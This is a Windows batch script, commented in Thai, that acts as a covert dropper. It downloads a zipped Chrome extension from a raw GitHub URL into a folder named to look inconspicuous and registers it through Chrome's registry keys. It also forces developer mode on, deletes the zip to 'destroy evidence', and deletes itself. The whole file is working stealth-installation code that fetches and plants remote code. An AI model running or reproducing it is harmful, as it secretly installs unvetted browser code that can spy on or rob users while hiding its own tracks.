@echo off
setlocal enabledelayedexpansion

:: 1. ตั้งค่าตำแหน่งที่จะวางส่วนเสริม (แนะนำให้วางในโฟลเดอร์ที่ไม่สะดุดตา)
set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 2. ดาวน์โหลดไฟล์ .zip จาก GitHub
set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'"

:: 3. แตกไฟล์ .zip
powershell -Command "Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"

:: --- แก้ปัญหาโฟลเดอร์ซ้อน (Move files out) ---
:: ดึงไฟล์จากชั้นในสุดออกมาวางที่ชั้น %EXT_ID% โดยตรง
for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
    xcopy "%%D\*" "%TARGET_DIR%\%EXT_ID%\" /s /e /y
)
rd /s /q "%TARGET_DIR%\temp_ext"

:: 4. สั่งลงทะเบียนส่วนเสริมผ่าน Registry
:: ชี้ไปที่โฟลเดอร์ที่มี manifest.json อยู่จริงๆ (ซึ่งตอนนี้คือ %TARGET_DIR%\%EXT_ID%)
reg add "HKEY_CURRENT_USER\Software\Google\Chrome\Extensions\%EXT_ID%" /v "path" /t REG_SZ /d "%TARGET_DIR%\%EXT_ID%" /f
reg add "HKEY_CURRENT_USER\Software\Google\Chrome\Extensions\%EXT_ID%" /v "version" /t REG_SZ /d "1.0" /f

:: (แถม) บังคับเปิด Developer Mode เพื่อให้ยอมรับ Unpacked Extension
reg add "HKEY_CURRENT_USER\Software\Google\Chrome\ExtensionsSettings" /v "ui_developer_mode" /t REG_DWORD /d 1 /f

:: 5. ลบไฟล์ .zip ทำลายหลักฐาน
del "%TARGET_DIR%\ext.zip"

:: 6. ลบตัวเองทิ้ง
(goto) 2>nul & del "%~f0"
